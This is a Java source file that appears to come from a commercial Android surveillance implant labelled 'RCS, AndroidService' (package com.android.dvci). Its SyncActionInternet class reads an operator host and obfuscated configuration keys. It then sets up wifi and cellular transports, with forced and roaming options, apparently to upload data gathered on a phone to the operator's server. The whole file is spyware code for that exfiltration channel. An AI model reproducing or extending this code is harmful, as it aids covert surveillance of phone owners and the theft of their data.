/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncActionInternet.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action;

import com.android.dvci.action.sync.GprsTransport;
import com.android.dvci.action.sync.WifiTransport;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfAction;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

/**
 * The Class SyncActionInternet.
 */
public class SyncActionInternet extends SyncAction {

	private static final String TAG = "SyncActionInternet"; //$NON-NLS-1$

	String host;

	protected boolean wifi;
	protected boolean gprs;

	protected boolean wifiForced;
	private boolean gprsForced;
	private boolean gprsRoaming;

	/**
	 * Instantiates a new sync action internet.
	 * 
	 * @param params
	 *            the conf params
	 */
	public SyncActionInternet(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
	 */
	@Override
	protected boolean parse(final ConfAction params) {
		try {
			host = StringUtils.unspace(params.getString("host"));
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED, host is missing"); //$NON-NLS-1$
			}

			return false;
		}

		try {
			gprs = params.getBoolean(M.e("cell"));
			wifi = params.getBoolean(M.e("wifi"));
			wifiForced = wifi;

			gprsForced = params.getBoolean(M.e("cellforced"), true);
			gprsRoaming = params.getBoolean(M.e("cellroaming"), false);
			
			
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params using default values");
			}

			gprs = false;
			wifi = true;
			wifiForced = wifi;
		}
		
		if (Cfg.DEBUG) {
			final StringBuffer sb = new StringBuffer();
			sb.append("gprs: " + gprs);
			sb.append("gprsForced: " + gprsForced);
			sb.append("gprsRoaming: " + gprsRoaming);
			sb.append(" wifi: " + wifi);
			sb.append(" stop: " + considerStop());
			sb.append(" host: " + host);

			Check.log(TAG + sb.toString());
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#initTransport()
	 */
	@Override
	protected boolean initTransport() {
		transports.clear();

		if (Cfg.DEBUG) {
			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
		}

		transports.addElement(new WifiTransport(host, wifiForced));

		if (gprs) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
			}

			transports.addElement(new GprsTransport(host, gprsForced, gprsRoaming));
		}

		return true;
	}

}
